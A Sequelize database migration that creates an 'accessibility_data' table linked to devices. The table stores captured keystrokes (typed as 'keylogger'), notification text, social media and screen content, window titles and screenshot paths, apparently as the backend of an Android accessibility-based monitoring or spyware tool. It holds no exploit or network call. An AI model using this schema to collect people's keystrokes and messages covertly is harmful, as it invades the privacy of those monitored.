'use strict';

module.exports = {
  up: async (queryInterface, Sequelize) => {
    const transaction = await queryInterface.sequelize.transaction();
    const tableName = 'accessibility_data';
    
    try {
      // Check if table exists
      const [tables] = await queryInterface.sequelize.query(
        `SHOW TABLES LIKE '${tableName}'`,
        { transaction }
      );
      
      if (tables.length === 0) {
        // If table doesn't exist, create it with the correct schema
        await queryInterface.createTable(tableName, {
          id: {
            type: Sequelize.UUID,
            defaultValue: Sequelize.UUIDV4,
            primaryKey: true
          },
          device_id: {
            type: Sequelize.STRING(255),
            allowNull: false,
            references: {
              model: 'devices',
              key: 'device_id'  // Updated to reference the correct column in devices table
            },
            onUpdate: 'CASCADE',
            onDelete: 'CASCADE',
            comment: 'Reference to devices table (device_id)'
          },
          data_type: {
            type: Sequelize.ENUM('keylogger', 'notifications', 'social_media', 'screen_content', 'ui_events'),
            allowNull: false,
            defaultValue: 'ui_events',
            comment: 'Type of accessibility data'
          },
          app_package: {
            type: Sequelize.STRING(255),
            allowNull: true,
            comment: 'Package name of the source app'
          },
          app_name: {
            type: Sequelize.STRING(255),
            allowNull: true,
            comment: 'Display name of the source app'
          },
          event_type: {
            type: Sequelize.STRING(100),
            allowNull: true
          },
          content_text: {
            type: Sequelize.TEXT,
            allowNull: true,
            comment: 'Text content captured'
          },
          content_description: {
            type: Sequelize.TEXT,
            allowNull: true
          },
          class_name: {
            type: Sequelize.STRING(255),
            allowNull: true
          },
          view_id: {
            type: Sequelize.STRING(255),
            allowNull: true
          },
          window_title: {
            type: Sequelize.STRING(500),
            allowNull: true,
            comment: 'Window or activity title'
          },
          notification_title: {
            type: Sequelize.STRING(500),
            allowNull: true,
            comment: 'Notification title (for notification events)'
          },
          notification_text: {
            type: Sequelize.TEXT,
            allowNull: true,
            comment: 'Notification content text'
          },
          notification_key: {
            type: Sequelize.STRING(255),
            allowNull: true,
            comment: 'Notification key'
          },
          keystrokes: {
            type: Sequelize.TEXT,
            allowNull: true,
            comment: 'Captured keystrokes (for keylogger)'
          },
          coordinates: {
            type: Sequelize.JSON,
            allowNull: true,
            comment: 'UI element coordinates {x, y, width, height}'
          },
          screenshot_path: {
            type: Sequelize.STRING(1000),
            allowNull: true
          },
          metadata: {
            type: Sequelize.JSON,
            allowNull: true
          },
          timestamp: {
            type: Sequelize.DATE,
            allowNull: false,
            defaultValue: Sequelize.literal('CURRENT_TIMESTAMP')
          },
          is_sensitive: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: false,
            comment: 'Whether this data contains sensitive information'
          },
          is_deleted: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: false,
            comment: 'Soft delete flag'
          },
          created_at: {
            type: Sequelize.DATE,
            allowNull: false,
            defaultValue: Sequelize.literal('CURRENT_TIMESTAMP')
          },
          updated_at: {
            type: Sequelize.DATE,
            allowNull: false,
            defaultValue: Sequelize.literal('CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP')
          }
        }, { transaction });

        // Add indexes
        await queryInterface.addIndex(tableName, ['device_id'], {
          name: 'idx_accessibility_data_device_id',
          transaction
        });
        
        await queryInterface.addIndex(tableName, ['data_type'], {
          name: 'idx_accessibility_data_type',
          transaction
        });
        
        await queryInterface.addIndex(tableName, ['app_package'], {
          name: 'idx_accessibility_data_app_package',
          transaction
        });
        
        await queryInterface.addIndex(tableName, ['timestamp'], {
          name: 'idx_accessibility_data_timestamp',
          transaction
        });
        
        await queryInterface.addIndex(tableName, ['is_sensitive'], {
          name: 'idx_accessibility_data_sensitive',
          transaction
        });
      } else {
        // Table exists, add any missing columns
        const columns = await queryInterface.describeTable(tableName, { transaction });
        
        // Add missing columns
        const columnsToAdd = [
          {
            name: 'data_type',
            type: 'ENUM',
            enumValues: ['keylogger', 'notifications', 'social_media', 'screen_content', 'ui_events'],
            allowNull: false,
            defaultValue: 'ui_events',
            comment: 'Type of accessibility data'
          },
          {
            name: 'app_name',
            type: 'STRING',
            allowNull: true,
            comment: 'Display name of the source app'
          },
          {
            name: 'window_title',
            type: 'STRING',
            allowNull: true,
            comment: 'Window or activity title'
          },
          {
            name: 'notification_title',
            type: 'STRING',
            allowNull: true,
            comment: 'Notification title (for notification events)'
          },
          {
            name: 'notification_text',
            type: 'TEXT',
            allowNull: true,
            comment: 'Notification content text'
          },
          {
            name: 'notification_key',
            type: 'STRING',
            allowNull: true,
            comment: 'Notification key'
          },
          {
            name: 'keystrokes',
            type: 'TEXT',
            allowNull: true,
            comment: 'Captured keystrokes (for keylogger)'
          },
          {
            name: 'coordinates',
            type: 'JSON',
            allowNull: true,
            comment: 'UI element coordinates {x, y, width, height}'
          },
          {
            name: 'is_sensitive',
            type: 'BOOLEAN',
            allowNull: false,
            defaultValue: false,
            comment: 'Whether this data contains sensitive information'
          },
          {
            name: 'is_deleted',
            type: 'BOOLEAN',
            allowNull: false,
            defaultValue: false,
            comment: 'Soft delete flag'
          }
        ];

        for (const column of columnsToAdd) {
          if (!columns[column.name]) {
            if (column.type === 'ENUM') {
              // For ENUM type, we need to use raw SQL in MySQL
              await queryInterface.sequelize.query(
                `ALTER TABLE ${tableName} ADD COLUMN ${column.name} ENUM(${column.enumValues.map(v => `'${v}'`).join(',')}) ${column.allowNull ? 'NULL' : 'NOT NULL'} COMMENT '${column.comment || ''}'`,
                { transaction }
              );
              
              if (column.defaultValue) {
                await queryInterface.sequelize.query(
                  `ALTER TABLE ${tableName} ALTER COLUMN ${column.name} SET DEFAULT '${column.defaultValue}'`,
                  { transaction }
                );
              }
            } else {
              await queryInterface.addColumn(
                tableName,
                column.name,
                {
                  type: Sequelize[column.type],
                  allowNull: column.allowNull,
                  defaultValue: column.defaultValue,
                  comment: column.comment
                },
                { transaction }
              );
            }
          }
        }
      }
      
      await transaction.commit();
    } catch (error) {
      await transaction.rollback();
      console.error('Error in accessibility_data migration:', error);
      throw error;
    }
  },

  down: async (queryInterface, Sequelize) => {
    // This is a one-way migration, no down migration provided
    // as it would be destructive to rollback data structure changes
    return Promise.resolve();
  }
};
